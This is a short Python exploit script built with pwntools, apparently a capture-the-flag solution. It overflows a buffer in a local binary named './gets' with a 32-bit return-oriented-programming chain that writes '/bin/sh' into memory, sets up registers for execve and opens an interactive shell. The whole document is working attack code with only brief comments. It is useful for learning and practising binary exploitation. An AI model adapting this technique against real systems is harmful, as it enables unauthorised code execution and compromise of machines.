from pwn import *

# move /bin into address
payload = "a"*28
payload += p32(0x0806f02a) # pop edx ret
payload += p32(0x080e9040) # start writing here
payload += p32(0x080b81c6) # pop eax ret
payload += '/bin'
payload += p32(0x080549db) # mov [edx] eax ret

# move /sh into address
payload += p32(0x0806f02a) # pop edx ret
payload += p32(0x080e9044) # start writing here
payload += p32(0x080b81c6) # pop eax ret
payload += '/shX'
payload += p32(0x080549db) # mov [edx] eax ret

# zero out the x
payload += p32(0x08049303) # xor eax eax ret
payload += p32(0x0806f02a) # pop edx ret
payload += p32(0x080e9047) # zero out the X 
payload += p32(0x080549db) # mov [edx] eax ret

# set ebx and zero out ecx
payload += p32(0x0806f051) # pop ecx pop ebx ret
payload += p32(0xffffffff)
payload += p32(0x080e9040) # address of /bin/sh
payload += p32(0x80d5dc1) # inc ecx ret

# zero out edx
payload += p32(0x0806f02a) # pop edx ret
payload += p32(0xffffffff)
payload += p32(0x0805d097) # inc edx ret

#set eax to 0xb and get shell
payload += p32(0x080b81c6) # pop eax ret
payload += p32(0x4141410b) # value to put in eax
payload += p32(0x080919f9) # movzx eax al ret # return only 0xb
payload += p32(0x0806cc25) # int 0x80
payload += p32(0x080481b2) # ret

# send payload
sh = process('./gets')
sh.recvuntil("NAME!")
sh.sendline(payload)
sh.interactive()
